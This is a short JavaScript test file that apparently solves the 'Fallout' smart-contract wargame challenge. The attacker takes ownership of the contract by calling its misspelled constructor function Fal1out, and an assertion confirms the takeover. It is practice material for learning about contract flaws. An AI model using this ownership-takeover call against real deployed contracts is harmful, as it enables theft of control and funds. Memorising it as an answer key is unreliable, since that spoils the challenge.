const Fallout = artifacts.require('Fallout');
const { expect } = require('chai');

contract('[Challenge] Fallout', function ([deployer, attacker, someUser, ...otherAccounts]) {
  before(async function () {
    /** SETUP SCENARIO */
    this.fallout = await Fallout.new({ from: deployer });
  });

  it('Exploit', async function () {
    /** YOUR EXPLOIT GOES HERE */
    await this.fallout.Fal1out({ from: attacker });
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    expect(await this.fallout.owner()).eq(attacker);
  });
});
